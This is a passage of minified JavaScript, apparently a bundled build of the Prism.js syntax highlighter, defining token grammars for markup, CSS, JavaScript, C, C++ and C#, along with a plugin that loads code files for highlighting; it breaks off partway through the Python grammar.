Ja<"u"&&(Ja.Prism=e),e.languages.markup={comment:{pattern:/<!--(?:(?!<!--)[\s\S])*?-->/,greedy:!0},prolog:{pattern:/<\?[\s\S]+?\?>/,greedy:!0},doctype:{pattern:/<!DOCTYPE(?:[^>"'[\]]|"[^"]*"|'[^']*')+(?:\[(?:[^<"'\]]|"[^"]*"|'[^']*'|<(?!!--)|<!--(?:[^-]|-(?!->))*-->)*\]\s*)?>/i,greedy:!0,inside:{"internal-subset":{pattern:/(^[^\[]*\[)[\s\S]+(?=\]>$)/,lookbehind:!0,greedy:!0,inside:null},string:{pattern:/"[^"]*"|'[^']*'/,greedy:!0},punctuation:/^<!|>$|[[\]]/,"doctype-tag":/^DOCTYPE/i,name:/[^\s<>'"]+/}},cdata:{pattern:/<!\[CDATA\[[\s\S]*?\]\]>/i,greedy:!0},tag:{pattern:/<\/?(?!\d)[^\s>\/=$<%]+(?:\s(?:\s*[^\s>\/=]+(?:\s*=\s*(?:"[^"]*"|'[^']*'|[^\s'">=]+(?=[\s>]))|(?=[\s/>])))+)?\s*\/?>/,greedy:!0,inside:{tag:{pattern:/^<\/?[^\s>\/]+/,inside:{punctuation:/^<\/?/,namespace:/^[^\s>\/:]+:/}},"special-attr":[],"attr-value":{pattern:/=\s*(?:"[^"]*"|'[^']*'|[^\s'">=]+)/,inside:{punctuation:[{pattern:/^=/,alias:"attr-equals"},{pattern:/^(\s*)["']|["']$/,lookbehind:!0}]}},punctuation:/\/?>/,"attr-name":{pattern:/[^\s>\/]+/,inside:{namespace:/^[^\s>\/:]+:/}}}},entity:[{pattern:/&[\da-z]{1,8};/i,alias:"named-entity"},/&#x?[\da-f]{1,8};/i]},e.languages.markup.tag.inside["attr-value"].inside.entity=e.languages.markup.entity,e.languages.markup.doctype.inside["internal-subset"].inside=e.languages.markup,e.hooks.add("wrap",function(n){n.type==="entity"&&(n.attributes.title=n.content.replace(/&amp;/,"&"))}),Object.defineProperty(e.languages.markup.tag,"addInlined",{value:function(r,s){var o={};o["language-"+s]={pattern:/(^<!\[CDATA\[)[\s\S]+?(?=\]\]>$)/i,lookbehind:!0,inside:e.languages[s]},o.cdata=/^<!\[CDATA\[|\]\]>$/i;var a={"included-cdata":{pattern:/<!\[CDATA\[[\s\S]*?\]\]>/i,inside:o}};a["language-"+s]={pattern:/[\s\S]+/,inside:e.languages[s]};var l={};l[r]={pattern:RegExp(/(<__[^>]*>)(?:<!\[CDATA\[(?:[^\]]|\](?!\]>))*\]\]>|(?!<!\[CDATA\[)[\s\S])*?(?=<\/__>)/.source.replace(/__/g,function(){return r}),"i"),lookbehind:!0,greedy:!0,inside:a},e.languages.insertBefore("markup","cdata",l)}}),Object.defineProperty(e.languages.markup.tag,"addAttribute",{value:function(n,r){e.languages.markup.tag.inside["special-attr"].push({pattern:RegExp(/(^|["'\s])/.source+"(?:"+n+")"+/\s*=\s*(?:"[^"]*"|'[^']*'|[^\s'">=]+(?=[\s>]))/.source,"i"),lookbehind:!0,inside:{"attr-name":/^[^\s=]+/,"attr-value":{pattern:/=[\s\S]+/,inside:{value:{pattern:/(^=\s*(["']|(?!["'])))\S[\s\S]*(?=\2$)/,lookbehind:!0,alias:[r,"language-"+r],inside:e.languages[r]},punctuation:[{pattern:/^=/,alias:"attr-equals"},/"|'/]}}}})}}),e.languages.html=e.languages.markup,e.languages.mathml=e.languages.markup,e.languages.svg=e.languages.markup,e.languages.xml=e.languages.extend("markup",{}),e.languages.ssml=e.languages.xml,e.languages.atom=e.languages.xml,e.languages.rss=e.languages.xml,function(n){var r=/(?:"(?:\\(?:\r\n|[\s\S])|[^"\\\r\n])*"|'(?:\\(?:\r\n|[\s\S])|[^'\\\r\n])*')/;n.languages.css={comment:/\/\*[\s\S]*?\*\//,atrule:{pattern:RegExp("@[\\w-](?:"+/[^;{\s"']|\s+(?!\s)/.source+"|"+r.source+")*?"+/(?:;|(?=\s*\{))/.source),inside:{rule:/^@[\w-]+/,"selector-function-argument":{pattern:/(\bselector\s*\(\s*(?![\s)]))(?:[^()\s]|\s+(?![\s)])|\((?:[^()]|\([^()]*\))*\))+(?=\s*\))/,lookbehind:!0,alias:"selector"},keyword:{pattern:/(^|[^\w-])(?:and|not|only|or)(?![\w-])/,lookbehind:!0}}},url:{pattern:RegExp("\\burl\\((?:"+r.source+"|"+/(?:[^\\\r\n()"']|\\[\s\S])*/.source+")\\)","i"),greedy:!0,inside:{function:/^url/i,punctuation:/^\(|\)$/,string:{pattern:RegExp("^"+r.source+"$"),alias:"url"}}},selector:{pattern:RegExp(`(^|[{}\\s])[^{}\\s](?:[^{};"'\\s]|\\s+(?![\\s{])|`+r.source+")*(?=\\s*\\{)"),lookbehind:!0},string:{pattern:r,greedy:!0},property:{pattern:/(^|[^-\w\xA0-\uFFFF])(?!\s)[-_a-z\xA0-\uFFFF](?:(?!\s)[-\w\xA0-\uFFFF])*(?=\s*:)/i,lookbehind:!0},important:/!important\b/i,function:{pattern:/(^|[^-a-z0-9])[-a-z0-9]+(?=\()/i,lookbehind:!0},punctuation:/[(){};:,]/},n.languages.css.atrule.inside.rest=n.languages.css;var s=n.languages.markup;s&&(s.tag.addInlined("style","css"),s.tag.addAttribute("style","css"))}(e),e.languages.clike={comment:[{pattern:/(^|[^\\])\/\*[\s\S]*?(?:\*\/|$)/,lookbehind:!0,greedy:!0},{pattern:/(^|[^\\:])\/\/.*/,lookbehind:!0,greedy:!0}],string:{pattern:/(["'])(?:\\(?:\r\n|[\s\S])|(?!\1)[^\\\r\n])*\1/,greedy:!0},"class-name":{pattern:/(\b(?:class|extends|implements|instanceof|interface|new|trait)\s+|\bcatch\s+\()[\w.\\]+/i,lookbehind:!0,inside:{punctuation:/[.\\]/}},keyword:/\b(?:break|catch|continue|do|else|finally|for|function|if|in|instanceof|new|null|return|throw|try|while)\b/,boolean:/\b(?:false|true)\b/,function:/\b\w+(?=\()/,number:/\b0x[\da-f]+\b|(?:\b\d+(?:\.\d*)?|\B\.\d+)(?:e[+-]?\d+)?/i,operator:/[<>]=?|[!=]=?=?|--?|\+\+?|&&?|\|\|?|[?*/~^%]/,punctuation:/[{}[\];(),.:]/},e.languages.javascript=e.languages.extend("clike",{"class-name":[e.languages.clike["class-name"],{pattern:/(^|[^$\w\xA0-\uFFFF])(?!\s)[_$A-Z\xA0-\uFFFF](?:(?!\s)[$\w\xA0-\uFFFF])*(?=\.(?:constructor|prototype))/,lookbehind:!0}],keyword:[{pattern:/((?:^|\})\s*)catch\b/,lookbehind:!0},{pattern:/(^|[^.]|\.\.\.\s*)\b(?:as|assert(?=\s*\{)|async(?=\s*(?:function\b|\(|[$\w\xA0-\uFFFF]|$))|await|break|case|class|const|continue|debugger|default|delete|do|else|enum|export|extends|finally(?=\s*(?:\{|$))|for|from(?=\s*(?:['"]|$))|function|(?:get|set)(?=\s*(?:[#\[$\w\xA0-\uFFFF]|$))|if|implements|import|in|instanceof|interface|let|new|null|of|package|private|protected|public|return|static|super|switch|this|throw|try|typeof|undefined|var|void|while|with|yield)\b/,lookbehind:!0}],function:/#?(?!\s)[_$a-zA-Z\xA0-\uFFFF](?:(?!\s)[$\w\xA0-\uFFFF])*(?=\s*(?:\.\s*(?:apply|bind|call)\s*)?\()/,number:{pattern:RegExp(/(^|[^\w$])/.source+"(?:"+(/NaN|Infinity/.source+"|"+/0[bB][01]+(?:_[01]+)*n?/.source+"|"+/0[oO][0-7]+(?:_[0-7]+)*n?/.source+"|"+/0[xX][\dA-Fa-f]+(?:_[\dA-Fa-f]+)*n?/.source+"|"+/\d+(?:_\d+)*n/.source+"|"+/(?:\d+(?:_\d+)*(?:\.(?:\d+(?:_\d+)*)?)?|\.\d+(?:_\d+)*)(?:[Ee][+-]?\d+(?:_\d+)*)?/.source)+")"+/(?![\w$])/.source),lookbehind:!0},operator:/--|\+\+|\*\*=?|=>|&&=?|\|\|=?|[!=]==|<<=?|>>>?=?|[-+*/%&|^!=<>]=?|\.{3}|\?\?=?|\?\.?|[~:]/}),e.languages.javascript["class-name"][0].pattern=/(\b(?:class|extends|implements|instanceof|interface|new)\s+)[\w.\\]+/,e.languages.insertBefore("javascript","keyword",{regex:{pattern:RegExp(/((?:^|[^$\w\xA0-\uFFFF."'\])\s]|\b(?:return|yield))\s*)/.source+/\//.source+"(?:"+/(?:\[(?:[^\]\\\r\n]|\\.)*\]|\\.|[^/\\\[\r\n])+\/[dgimyus]{0,7}/.source+"|"+/(?:\[(?:[^[\]\\\r\n]|\\.|\[(?:[^[\]\\\r\n]|\\.|\[(?:[^[\]\\\r\n]|\\.)*\])*\])*\]|\\.|[^/\\\[\r\n])+\/[dgimyus]{0,7}v[dgimyus]{0,7}/.source+")"+/(?=(?:\s|\/\*(?:[^*]|\*(?!\/))*\*\/)*(?:$|[\r\n,.;:})\]]|\/\/))/.source),lookbehind:!0,greedy:!0,inside:{"regex-source":{pattern:/^(\/)[\s\S]+(?=\/[a-z]*$)/,lookbehind:!0,alias:"language-regex",inside:e.languages.regex},"regex-delimiter":/^\/|\/$/,"regex-flags":/^[a-z]+$/}},"function-variable":{pattern:/#?(?!\s)[_$a-zA-Z\xA0-\uFFFF](?:(?!\s)[$\w\xA0-\uFFFF])*(?=\s*[=:]\s*(?:async\s*)?(?:\bfunction\b|(?:\((?:[^()]|\([^()]*\))*\)|(?!\s)[_$a-zA-Z\xA0-\uFFFF](?:(?!\s)[$\w\xA0-\uFFFF])*)\s*=>))/,alias:"function"},parameter:[{pattern:/(function(?:\s+(?!\s)[_$a-zA-Z\xA0-\uFFFF](?:(?!\s)[$\w\xA0-\uFFFF])*)?\s*\(\s*)(?!\s)(?:[^()\s]|\s+(?![\s)])|\([^()]*\))+(?=\s*\))/,lookbehind:!0,inside:e.languages.javascript},{pattern:/(^|[^$\w\xA0-\uFFFF])(?!\s)[_$a-z\xA0-\uFFFF](?:(?!\s)[$\w\xA0-\uFFFF])*(?=\s*=>)/i,lookbehind:!0,inside:e.languages.javascript},{pattern:/(\(\s*)(?!\s)(?:[^()\s]|\s+(?![\s)])|\([^()]*\))+(?=\s*\)\s*=>)/,lookbehind:!0,inside:e.languages.javascript},{pattern:/((?:\b|\s|^)(?!(?:as|async|await|break|case|catch|class|const|continue|debugger|default|delete|do|else|enum|export|extends|finally|for|from|function|get|if|implements|import|in|instanceof|interface|let|new|null|of|package|private|protected|public|return|set|static|super|switch|this|throw|try|typeof|undefined|var|void|while|with|yield)(?![$\w\xA0-\uFFFF]))(?:(?!\s)[_$a-zA-Z\xA0-\uFFFF](?:(?!\s)[$\w\xA0-\uFFFF])*\s*)\(\s*|\]\s*\(\s*)(?!\s)(?:[^()\s]|\s+(?![\s)])|\([^()]*\))+(?=\s*\)\s*\{)/,lookbehind:!0,inside:e.languages.javascript}],constant:/\b[A-Z](?:[A-Z_]|\dx?)*\b/}),e.languages.insertBefore("javascript","string",{hashbang:{pattern:/^#!.*/,greedy:!0,alias:"comment"},"template-string":{pattern:/`(?:\\[\s\S]|\$\{(?:[^{}]|\{(?:[^{}]|\{[^}]*\})*\})+\}|(?!\$\{)[^\\`])*`/,greedy:!0,inside:{"template-punctuation":{pattern:/^`|`$/,alias:"string"},interpolation:{pattern:/((?:^|[^\\])(?:\\{2})*)\$\{(?:[^{}]|\{(?:[^{}]|\{[^}]*\})*\})+\}/,lookbehind:!0,inside:{"interpolation-punctuation":{pattern:/^\$\{|\}$/,alias:"punctuation"},rest:e.languages.javascript}},string:/[\s\S]+/}},"string-property":{pattern:/((?:^|[,{])[ \t]*)(["'])(?:\\(?:\r\n|[\s\S])|(?!\2)[^\\\r\n])*\2(?=\s*:)/m,lookbehind:!0,greedy:!0,alias:"property"}}),e.languages.insertBefore("javascript","operator",{"literal-property":{pattern:/((?:^|[,{])[ \t]*)(?!\s)[_$a-zA-Z\xA0-\uFFFF](?:(?!\s)[$\w\xA0-\uFFFF])*(?=\s*:)/m,lookbehind:!0,alias:"property"}}),e.languages.markup&&(e.languages.markup.tag.addInlined("script","javascript"),e.languages.markup.tag.addAttribute(/on(?:abort|blur|change|click|composition(?:end|start|update)|dblclick|error|focus(?:in|out)?|key(?:down|up)|load|mouse(?:down|enter|leave|move|out|over|up)|reset|resize|scroll|select|slotchange|submit|unload|wheel)/.source,"javascript")),e.languages.js=e.languages.javascript,function(){if(typeof e>"u"||typeof document>"u")return;Element.prototype.matches||(Element.prototype.matches=Element.prototype.msMatchesSelector||Element.prototype.webkitMatchesSelector);var n="Loading…",r=function(x,f){return"✖ Error "+x+" while fetching file: "+f},s="✖ Error: File does not exist or is empty",o={js:"javascript",py:"python",rb:"ruby",ps1:"powershell",psm1:"powershell",sh:"bash",bat:"batch",h:"c",tex:"latex"},a="data-src-status",l="loading",c="loaded",u="failed",h="pre[data-src]:not(["+a+'="'+c+'"]):not(['+a+'="'+l+'"])';function p(x,f,d){var g=new XMLHttpRequest;g.open("GET",x,!0),g.onreadystatechange=function(){g.readyState==4&&(g.status<400&&g.responseText?f(g.responseText):g.status>=400?d(r(g.status,g.statusText)):d(s))},g.send(null)}function m(x){var f=/^\s*(\d+)\s*(?:(,)\s*(?:(\d+)\s*)?)?$/.exec(x||"");if(f){var d=Number(f[1]),g=f[2],_=f[3];return g?_?[d,Number(_)]:[d,void 0]:[d,d]}}e.hooks.add("before-highlightall",function(x){x.selector+=", "+h}),e.hooks.add("before-sanity-check",function(x){var f=x.element;if(f.matches(h)){x.code="",f.setAttribute(a,l);var d=f.appendChild(document.createElement("CODE"));d.textContent=n;var g=f.getAttribute("data-src"),_=x.language;if(_==="none"){var v=(/\.(\w+)$/.exec(g)||[,"none"])[1];_=o[v]||v}e.util.setLanguage(d,_),e.util.setLanguage(f,_);var w=e.plugins.autoloader;w&&w.loadLanguages(_),p(g,function(S){f.setAttribute(a,c);var T=m(f.getAttribute("data-range"));if(T){var D=S.split(/\r\n?|\n/g),y=T[0],R=T[1]==null?D.length:T[1];y<0&&(y+=D.length),y=Math.max(0,Math.min(y-1,D.length)),R<0&&(R+=D.length),R=Math.max(0,Math.min(R,D.length)),S=D.slice(y,R).join(`
`),f.hasAttribute("data-start")||f.setAttribute("data-start",String(y+1))}d.textContent=S,e.highlightElement(d)},function(S){f.setAttribute(a,u),d.textContent=S})}}),e.plugins.fileHighlight={highlight:function(f){for(var d=(f||document).querySelectorAll(h),g=0,_;_=d[g++];)e.highlightElement(_)}};var E=!1;e.fileHighlight=function(){E||(console.warn("Prism.fileHighlight is deprecated. Use `Prism.plugins.fileHighlight.highlight` instead."),E=!0),e.plugins.fileHighlight.highlight.apply(this,arguments)}}()})(Uo);var Wh=Uo.exports;const qr=Vh(Wh);Prism.languages.c=Prism.languages.extend("clike",{comment:{pattern:/\/\/(?:[^\r\n\\]|\\(?:\r\n?|\n|(?![\r\n])))*|\/\*[\s\S]*?(?:\*\/|$)/,greedy:!0},string:{pattern:/"(?:\\(?:\r\n|[\s\S])|[^"\\\r\n])*"/,greedy:!0},"class-name":{pattern:/(\b(?:enum|struct)\s+(?:__attribute__\s*\(\([\s\S]*?\)\)\s*)?)\w+|\b[a-z]\w*_t\b/,lookbehind:!0},keyword:/\b(?:_Alignas|_Alignof|_Atomic|_Bool|_Complex|_Generic|_Imaginary|_Noreturn|_Static_assert|_Thread_local|__attribute__|asm|auto|break|case|char|const|continue|default|do|double|else|enum|extern|float|for|goto|if|inline|int|long|register|return|short|signed|sizeof|static|struct|switch|typedef|typeof|union|unsigned|void|volatile|while)\b/,function:/\b[a-z_]\w*(?=\s*\()/i,number:/(?:\b0x(?:[\da-f]+(?:\.[\da-f]*)?|\.[\da-f]+)(?:p[+-]?\d+)?|(?:\b\d+(?:\.\d*)?|\B\.\d+)(?:e[+-]?\d+)?)[ful]{0,4}/i,operator:/>>=?|<<=?|->|([-+&|:])\1|[?:~]|[-+*/%&|^!=<>]=?/});Prism.languages.insertBefore("c","string",{char:{pattern:/'(?:\\(?:\r\n|[\s\S])|[^'\\\r\n]){0,32}'/,greedy:!0}});Prism.languages.insertBefore("c","string",{macro:{pattern:/(^[\t ]*)#\s*[a-z](?:[^\r\n\\/]|\/(?!\*)|\/\*(?:[^*]|\*(?!\/))*\*\/|\\(?:\r\n|[\s\S]))*/im,lookbehind:!0,greedy:!0,alias:"property",inside:{string:[{pattern:/^(#\s*include\s*)<[^>]+>/,lookbehind:!0},Prism.languages.c.string],char:Prism.languages.c.char,comment:Prism.languages.c.comment,"macro-name":[{pattern:/(^#\s*define\s+)\w+\b(?!\()/i,lookbehind:!0},{pattern:/(^#\s*define\s+)\w+\b(?=\()/i,lookbehind:!0,alias:"function"}],directive:{pattern:/^(#\s*)[a-z]+/,lookbehind:!0,alias:"keyword"},"directive-hash":/^#/,punctuation:/##|\\(?=[\r\n])/,expression:{pattern:/\S[\s\S]*/,inside:Prism.languages.c}}}});Prism.languages.insertBefore("c","function",{constant:/\b(?:EOF|NULL|SEEK_CUR|SEEK_END|SEEK_SET|__DATE__|__FILE__|__LINE__|__TIMESTAMP__|__TIME__|__func__|stderr|stdin|stdout)\b/});delete Prism.languages.c.boolean;(function(i){var t=/\b(?:alignas|alignof|asm|auto|bool|break|case|catch|char|char16_t|char32_t|char8_t|class|co_await|co_return|co_yield|compl|concept|const|const_cast|consteval|constexpr|constinit|continue|decltype|default|delete|do|double|dynamic_cast|else|enum|explicit|export|extern|final|float|for|friend|goto|if|import|inline|int|int16_t|int32_t|int64_t|int8_t|long|module|mutable|namespace|new|noexcept|nullptr|operator|override|private|protected|public|register|reinterpret_cast|requires|return|short|signed|sizeof|static|static_assert|static_cast|struct|switch|template|this|thread_local|throw|try|typedef|typeid|typename|uint16_t|uint32_t|uint64_t|uint8_t|union|unsigned|using|virtual|void|volatile|wchar_t|while)\b/,e=/\b(?!<keyword>)\w+(?:\s*\.\s*\w+)*\b/.source.replace(/<keyword>/g,function(){return t.source});i.languages.cpp=i.languages.extend("c",{"class-name":[{pattern:RegExp(/(\b(?:class|concept|enum|struct|typename)\s+)(?!<keyword>)\w+/.source.replace(/<keyword>/g,function(){return t.source})),lookbehind:!0},/\b[A-Z]\w*(?=\s*::\s*\w+\s*\()/,/\b[A-Z_]\w*(?=\s*::\s*~\w+\s*\()/i,/\b\w+(?=\s*<(?:[^<>]|<(?:[^<>]|<[^<>]*>)*>)*>\s*::\s*\w+\s*\()/],keyword:t,number:{pattern:/(?:\b0b[01']+|\b0x(?:[\da-f']+(?:\.[\da-f']*)?|\.[\da-f']+)(?:p[+-]?[\d']+)?|(?:\b[\d']+(?:\.[\d']*)?|\B\.[\d']+)(?:e[+-]?[\d']+)?)[ful]{0,4}/i,greedy:!0},operator:/>>=?|<<=?|->|--|\+\+|&&|\|\||[?:~]|<=>|[-+*/%&|^!=<>]=?|\b(?:and|and_eq|bitand|bitor|not|not_eq|or|or_eq|xor|xor_eq)\b/,boolean:/\b(?:false|true)\b/}),i.languages.insertBefore("cpp","string",{module:{pattern:RegExp(/(\b(?:import|module)\s+)/.source+"(?:"+/"(?:\\(?:\r\n|[\s\S])|[^"\\\r\n])*"|<[^<>\r\n]*>/.source+"|"+/<mod-name>(?:\s*:\s*<mod-name>)?|:\s*<mod-name>/.source.replace(/<mod-name>/g,function(){return e})+")"),lookbehind:!0,greedy:!0,inside:{string:/^[<"][\s\S]+/,operator:/:/,punctuation:/\./}},"raw-string":{pattern:/R"([^()\\ ]{0,16})\([\s\S]*?\)\1"/,alias:"string",greedy:!0}}),i.languages.insertBefore("cpp","keyword",{"generic-function":{pattern:/\b(?!operator\b)[a-z_]\w*\s*<(?:[^<>]|<[^<>]*>)*>(?=\s*\()/i,inside:{function:/^\w+/,generic:{pattern:/<[\s\S]+/,alias:"class-name",inside:i.languages.cpp}}}}),i.languages.insertBefore("cpp","operator",{"double-colon":{pattern:/::/,alias:"punctuation"}}),i.languages.insertBefore("cpp","class-name",{"base-clause":{pattern:/(\b(?:class|struct)\s+\w+\s*:\s*)[^;{}"'\s]+(?:\s+[^;{}"'\s]+)*(?=\s*[;{])/,lookbehind:!0,greedy:!0,inside:i.languages.extend("cpp",{})}}),i.languages.insertBefore("inside","double-colon",{"class-name":/\b[a-z_]\w*\b(?!\s*::)/i},i.languages.cpp["base-clause"])})(Prism);(function(i){function t(V,q){return V.replace(/<<(\d+)>>/g,function(J,K){return"(?:"+q[+K]+")"})}function e(V,q,J){return RegExp(t(V,q),"")}function n(V,q){for(var J=0;J<q;J++)V=V.replace(/<<self>>/g,function(){return"(?:"+V+")"});return V.replace(/<<self>>/g,"[^\\s\\S]")}var r={type:"bool byte char decimal double dynamic float int long object sbyte short string uint ulong ushort var void",typeDeclaration:"class enum interface record struct",contextual:"add alias and ascending async await by descending from(?=\\s*(?:\\w|$)) get global group into init(?=\\s*;) join let nameof not notnull on or orderby partial remove select set unmanaged value when where with(?=\\s*{)",other:"abstract as base break case catch checked const continue default delegate do else event explicit extern finally fixed for foreach goto if implicit in internal is lock namespace new null operator out override params private protected public readonly ref return sealed sizeof stackalloc static switch this throw try typeof unchecked unsafe using virtual volatile while yield"};function s(V){return"\\b(?:"+V.trim().replace(/ /g,"|")+")\\b"}var o=s(r.typeDeclaration),a=RegExp(s(r.type+" "+r.typeDeclaration+" "+r.contextual+" "+r.other)),l=s(r.typeDeclaration+" "+r.contextual+" "+r.other),c=s(r.type+" "+r.typeDeclaration+" "+r.other),u=n(/<(?:[^<>;=+\-*/%&|^]|<<self>>)*>/.source,2),h=n(/\((?:[^()]|<<self>>)*\)/.source,2),p=/@?\b[A-Za-z_]\w*\b/.source,m=t(/<<0>>(?:\s*<<1>>)?/.source,[p,u]),E=t(/(?!<<0>>)<<1>>(?:\s*\.\s*<<1>>)*/.source,[l,m]),x=/\[\s*(?:,\s*)*\]/.source,f=t(/<<0>>(?:\s*(?:\?\s*)?<<1>>)*(?:\s*\?)?/.source,[E,x]),d=t(/[^,()<>[\];=+\-*/%&|^]|<<0>>|<<1>>|<<2>>/.source,[u,h,x]),g=t(/\(<<0>>+(?:,<<0>>+)+\)/.source,[d]),_=t(/(?:<<0>>|<<1>>)(?:\s*(?:\?\s*)?<<2>>)*(?:\s*\?)?/.source,[g,E,x]),v={keyword:a,punctuation:/[<>()?,.:[\]]/},w=/'(?:[^\r\n'\\]|\\.|\\[Uux][\da-fA-F]{1,8})'/.source,S=/"(?:\\.|[^\\"\r\n])*"/.source,T=/@"(?:""|\\[\s\S]|[^\\"])*"(?!")/.source;i.languages.csharp=i.languages.extend("clike",{string:[{pattern:e(/(^|[^$\\])<<0>>/.source,[T]),lookbehind:!0,greedy:!0},{pattern:e(/(^|[^@$\\])<<0>>/.source,[S]),lookbehind:!0,greedy:!0}],"class-name":[{pattern:e(/(\busing\s+static\s+)<<0>>(?=\s*;)/.source,[E]),lookbehind:!0,inside:v},{pattern:e(/(\busing\s+<<0>>\s*=\s*)<<1>>(?=\s*;)/.source,[p,_]),lookbehind:!0,inside:v},{pattern:e(/(\busing\s+)<<0>>(?=\s*=)/.source,[p]),lookbehind:!0},{pattern:e(/(\b<<0>>\s+)<<1>>/.source,[o,m]),lookbehind:!0,inside:v},{pattern:e(/(\bcatch\s*\(\s*)<<0>>/.source,[E]),lookbehind:!0,inside:v},{pattern:e(/(\bwhere\s+)<<0>>/.source,[p]),lookbehind:!0},{pattern:e(/(\b(?:is(?:\s+not)?|as)\s+)<<0>>/.source,[f]),lookbehind:!0,inside:v},{pattern:e(/\b<<0>>(?=\s+(?!<<1>>|with\s*\{)<<2>>(?:\s*[=,;:{)\]]|\s+(?:in|when)\b))/.source,[_,c,p]),inside:v}],keyword:a,number:/(?:\b0(?:x[\da-f_]*[\da-f]|b[01_]*[01])|(?:\B\.\d+(?:_+\d+)*|\b\d+(?:_+\d+)*(?:\.\d+(?:_+\d+)*)?)(?:e[-+]?\d+(?:_+\d+)*)?)(?:[dflmu]|lu|ul)?\b/i,operator:/>>=?|<<=?|[-=]>|([-+&|])\1|~|\?\?=?|[-+*/%&|^!=<>]=?/,punctuation:/\?\.?|::|[{}[\];(),.:]/}),i.languages.insertBefore("csharp","number",{range:{pattern:/\.\./,alias:"operator"}}),i.languages.insertBefore("csharp","punctuation",{"named-parameter":{pattern:e(/([(,]\s*)<<0>>(?=\s*:)/.source,[p]),lookbehind:!0,alias:"punctuation"}}),i.languages.insertBefore("csharp","class-name",{namespace:{pattern:e(/(\b(?:namespace|using)\s+)<<0>>(?:\s*\.\s*<<0>>)*(?=\s*[;{])/.source,[p]),lookbehind:!0,inside:{punctuation:/\./}},"type-expression":{pattern:e(/(\b(?:default|sizeof|typeof)\s*\(\s*(?!\s))(?:[^()\s]|\s(?!\s)|<<0>>)*(?=\s*\))/.source,[h]),lookbehind:!0,alias:"class-name",inside:v},"return-type":{pattern:e(/<<0>>(?=\s+(?:<<1>>\s*(?:=>|[({]|\.\s*this\s*\[)|this\s*\[))/.source,[_,E]),inside:v,alias:"class-name"},"constructor-invocation":{pattern:e(/(\bnew\s+)<<0>>(?=\s*[[({])/.source,[_]),lookbehind:!0,inside:v,alias:"class-name"},"generic-method":{pattern:e(/<<0>>\s*<<1>>(?=\s*\()/.source,[p,u]),inside:{function:e(/^<<0>>/.source,[p]),generic:{pattern:RegExp(u),alias:"class-name",inside:v}}},"type-list":{pattern:e(/\b((?:<<0>>\s+<<1>>|record\s+<<1>>\s*<<5>>|where\s+<<2>>)\s*:\s*)(?:<<3>>|<<4>>|<<1>>\s*<<5>>|<<6>>)(?:\s*,\s*(?:<<3>>|<<4>>|<<6>>))*(?=\s*(?:where|[{;]|=>|$))/.source,[o,m,p,_,a.source,h,/\bnew\s*\(\s*\)/.source]),lookbehind:!0,inside:{"record-arguments":{pattern:e(/(^(?!new\s*\()<<0>>\s*)<<1>>/.source,[m,h]),lookbehind:!0,greedy:!0,inside:i.languages.csharp},keyword:a,"class-name":{pattern:RegExp(_),greedy:!0,inside:v},punctuation:/[,()]/}},preprocessor:{pattern:/(^[\t ]*)#.*/m,lookbehind:!0,alias:"property",inside:{directive:{pattern:/(#)\b(?:define|elif|else|endif|endregion|error|if|line|nullable|pragma|region|undef|warning)\b/,lookbehind:!0,alias:"keyword"}}}});var D=S+"|"+w,y=t(/\/(?![*/])|\/\/[^\r\n]*[\r\n]|\/\*(?:[^*]|\*(?!\/))*\*\/|<<0>>/.source,[D]),R=n(t(/[^"'/()]|<<0>>|\(<<self>>*\)/.source,[y]),2),k=/\b(?:assembly|event|field|method|module|param|property|return|type)\b/.source,X=t(/<<0>>(?:\s*\(<<1>>*\))?/.source,[E,R]);i.languages.insertBefore("csharp","class-name",{attribute:{pattern:e(/((?:^|[^\s\w>)?])\s*\[\s*)(?:<<0>>\s*:\s*)?<<1>>(?:\s*,\s*<<1>>)*(?=\s*\])/.source,[k,X]),lookbehind:!0,greedy:!0,inside:{target:{pattern:e(/^<<0>>(?=\s*:)/.source,[k]),alias:"keyword"},"attribute-arguments":{pattern:e(/\(<<0>>*\)/.source,[R]),inside:i.languages.csharp},"class-name":{pattern:RegExp(E),inside:{punctuation:/\./}},punctuation:/[:,]/}}});var et=/:[^}\r\n]+/.source,P=n(t(/[^"'/()]|<<0>>|\(<<self>>*\)/.source,[y]),2),B=t(/\{(?!\{)(?:(?![}:])<<0>>)*<<1>>?\}/.source,[P,et]),W=n(t(/[^"'/()]|\/(?!\*)|\/\*(?:[^*]|\*(?!\/))*\*\/|<<0>>|\(<<self>>*\)/.source,[D]),2),Y=t(/\{(?!\{)(?:(?![}:])<<0>>)*<<1>>?\}/.source,[W,et]);function H(V,q){return{interpolation:{pattern:e(/((?:^|[^{])(?:\{\{)*)<<0>>/.source,[V]),lookbehind:!0,inside:{"format-string":{pattern:e(/(^\{(?:(?![}:])<<0>>)*)<<1>>(?=\}$)/.source,[q,et]),lookbehind:!0,inside:{punctuation:/^:/}},punctuation:/^\{|\}$/,expression:{pattern:/[\s\S]+/,alias:"language-csharp",inside:i.languages.csharp}}},string:/[\s\S]+/}}i.languages.insertBefore("csharp","string",{"interpolation-string":[{pattern:e(/(^|[^\\])(?:\$@|@\$)"(?:""|\\[\s\S]|\{\{|<<0>>|[^\\{"])*"/.source,[B]),lookbehind:!0,greedy:!0,inside:H(B,P)},{pattern:e(/(^|[^@\\])\$"(?:\\.|\{\{|<<0>>|[^\\"{])*"/.source,[Y]),lookbehind:!0,greedy:!0,inside:H(Y,W)}],char:{pattern:RegExp(w),greedy:!0}}),i.languages.dotnet=i.languages.cs=i.languages.csharp})(Prism);Prism.languages.python={comment:{pattern:/(^|[^\\])#.*/,lookbehind:!0,greedy:!0},"string-interpolation":{pattern:/(?:f|fr|rf)(?:("""|''')[\s\S]*?\1|("|')(?:\\.|(?!\2)[^\\\r\n])*\2)/i,greedy:!0,inside:{interpolation:{pattern:/((?:^|[^{])(?:\{\{)*)\{(?!\{)(?:[^{}]|\{(?!\{)(?:[^{}]|\{(?!\{)(?:[^{}])+\})+\})+\}/,lookbehind:!0,inside:{"format-spec":{pattern:/(:)[^:(){}]+(?=\}$)/,lookbehind:!0},"conversion-option":{pattern:/![sra](?=[:}]$)/,alias:"punctuation"},rest:null}},string:/[\s\S]+/}},"triple-quoted-string":{pattern:/(?:[rub]|br|rb)?("""|''')[\s\S]*?\1/i,greedy:!0,alias:"string"},string:{pattern:/(?:[rub]|br|rb)?("|')(?:\\.|(?!\1)[^\\\r\n])*\1/i,greedy:!0},function:{pattern:/((?:^|\s)def[ \t]+)[a-zA-Z_]\w*(?=\s*\()/g,lookbehind:!0},"class-name":{pattern:/(\bclass\s+)\w+/i,lookbehind:!0},decorator:{pattern:/(^[\t 